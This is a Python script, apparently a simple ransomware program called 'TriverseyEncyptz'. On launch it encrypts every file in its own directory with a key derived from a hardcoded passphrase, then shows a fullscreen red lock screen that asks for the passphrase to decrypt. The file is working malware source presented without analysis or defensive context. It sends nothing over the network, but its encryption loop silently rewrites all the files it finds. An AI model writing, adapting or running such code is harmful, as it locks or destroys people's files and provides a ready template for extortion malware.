import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import base64
import hashlib

# === CONFIGURATION ===
PASSPHRASE = "keydgf563"
SCRIPT_NAME = os.path.basename(__file__)

# === ENCRYPTION SETUP ===
def generate_key(passphrase):
    digest = hashlib.sha256(passphrase.encode()).digest()
    return base64.urlsafe_b64encode(digest)

key = generate_key(PASSPHRASE)
fernet = Fernet(key)

# === FILE HANDLING ===
def should_process(filename):
    return os.path.isfile(filename) and filename != SCRIPT_NAME

def encrypt_all_files():
    for filename in os.listdir():
        if should_process(filename):
            try:
                with open(filename, "rb") as f:
                    data = f.read()
                encrypted = fernet.encrypt(data)
                with open(filename, "wb") as f:
                    f.write(encrypted)
                print(f"[+] Encrypted: {filename}")
            except Exception as e:
                print(f"[!] Could not encrypt {filename}: {e}")

def decrypt_all_files():
    for filename in os.listdir():
        if should_process(filename):
            try:
                with open(filename, "rb") as f:
                    data = f.read()
                decrypted = fernet.decrypt(data)
                with open(filename, "wb") as f:
                    f.write(decrypted)
                print(f"[+] Decrypted: {filename}")
            except Exception as e:
                print(f"[!] Could not decrypt {filename}: {e}")
    messagebox.showinfo("Success", "Files successfully decrypted.")
    root.destroy()

# === GUI ===
def verify_pass():
    if entry.get() == PASSPHRASE:
        decrypt_all_files()
    else:
        messagebox.showerror("Incorrect", "Wrong passphrase.")

def exit_without_decrypting():
    root.destroy()

# === MAIN ===
if __name__ == "__main__":
    encrypt_all_files()

    root = tk.Tk()
    root.title("TriverseyEncyptz")
    root.configure(bg="red")
    root.attributes('-fullscreen', True)

    title = tk.Label(root, text="TriverseyEncyptz", font=("Arial", 40, "bold"), fg="white", bg="red")
    title.pack(pady=50)

    message = tk.Label(
        root,
        text="Oh no! Your files in this directory have been encrypted.\nPlease enter the secret passphrase below to decrypt them.",
        font=("Arial", 20),
        fg="white",
        bg="red",
        justify="center"
    )
    message.pack(pady=20)

    entry = tk.Entry(root, font=("Arial", 16), show="*", width=30)
    entry.pack(pady=10)

    btn_frame = tk.Frame(root, bg="red")
    btn_frame.pack(pady=20)

    decrypt_btn = tk.Button(
        btn_frame,
        text="Decrypt Files",
        command=verify_pass,
        font=("Arial", 16),
        bg="white",
        fg="red",
        padx=20,
        pady=5
    )
    decrypt_btn.grid(row=0, column=0, padx=10)

    exit_btn = tk.Button(
        btn_frame,
        text="I Understand the Risks – Don’t Unencrypt",
        command=exit_without_decrypting,
        font=("Arial", 14),
        bg="white",
        fg="red",
        padx=10,
        pady=5
    )
    exit_btn.grid(row=0, column=1, padx=10)

    root.mainloop()

